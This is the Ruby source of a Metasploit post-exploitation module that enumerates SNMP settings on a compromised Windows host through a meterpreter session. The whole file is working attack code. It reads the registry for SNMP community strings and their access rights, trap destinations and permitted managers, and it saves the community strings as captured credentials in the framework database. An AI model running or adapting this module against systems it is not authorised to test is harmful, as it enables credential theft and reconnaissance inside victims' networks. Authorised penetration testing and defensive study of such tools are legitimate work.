##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'


class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather SNMP Settings Enumeration (Registry)',
        'Description'   => %q{ This module will enumerate the SNMP service configuration },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'Tebo <tebo[at]attackresearch.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  # Run Method called when command run is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    if check_snmp
      community_strings
      trap_setup
    end
  end

  # Method for Checking if SNMP is installed on the target host
  def check_snmp
    print_status("Checking if SNMP is Installed")
    key = "HKLM\\System\\CurrentControlSet\\Services"
    if registry_enumkeys(key).include?("SNMP")
      print_status("\tSNMP is installed!")
      return true
    else
      print_error("\tSNMP is not installed on the target host")
      return false
    end
  end

  # Method for enumerating the Community Strings configured
  def community_strings
    comm_str = []
    tbl = Rex::Ui::Text::Table.new(
      'Header'  => "Comunity Strings",
      'Indent'  => 1,
      'Columns' =>
      [
        "Name",
        "Type"
      ])
    print_status("Enumerating community strings")
    key = "HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities"
    comm_str = registry_enumvals(key)
    if not comm_str.nil? and not comm_str.empty?
      comm_str.each do |c|

        case registry_getvaldata(key,c)
        when 4
          comm_type = "READ ONLY"
        when 1
          comm_type = "DISABLED"
        when 2
          comm_type = "NOTIFY"
        when 8
          comm_type = "READ & WRITE"
        when 16
          comm_type = "READ CREATE"
        end

        # Save data to table
        tbl << [c,comm_type]

        # Save Community Strings to DB
        report_auth_info(
          :host	=> session.sock.peerhost,
          :port	=> 161,
          :proto	=> 'udp',
          :sname	=> 'snmp',
          :user	=> '',
          :pass	=> c,
          :type	=> "snmp.community",
          :duplicate_ok	=> true
        )
      end
      print_status("")

      # Print table
      tbl.to_s.each_line do |l|
        print_status("\t#{l.chomp}")
      end
      print_status("")

      # Check who can connect using the Community Strings
      allowd_for_snmp_query

    else
      print_error("\tNo Community strings configured")

    end
  end

  # Method for enumerating the Traps configured
  def trap_setup
    print_status("Enumerating Trap Configuration")
    key = "HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\TrapConfiguration"
    trap_hosts = registry_enumkeys(key)
    if not trap_hosts.nil? and not trap_hosts.empty?
      trap_hosts.each do |c|
        print_status("Community Name: #{c}")
        session.framework.db.report_auth_info(
          :host	=> session.sock.peerhost,
          :port	=> 161,
          :proto	=> 'udp',
          :sname	=> 'snmp',
          :user	=> '',
          :pass	=> c,
          :type	=> "snmp.community",
          :duplicate_ok	=> true
        )
        t_comm_key = key+"\\"+c
        registry_enumvals(t_comm_key).each do |t|
          print_status("\tDestination: " + registry_getvaldata(t_comm_key,t))
        end

      end
    else
      print_status("No Traps are configured")
    end
  end

  # Method for enumerating Permitted Managers
  def allowd_for_snmp_query
    print_status("Enumerating Permitted Managers for Community Strings")
    key = "HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\PermittedManagers"
    managers = registry_enumvals(key)
    if not managers.nil? and not managers.empty?
      print_status("Community Strings can be accessed from:")
      managers.each do |m|
        print_status("\t#{registry_getvaldata(key,m)}")
      end

    else
      print_status("\tCommunity Strings can be accessed from any host")
    end
  end
end
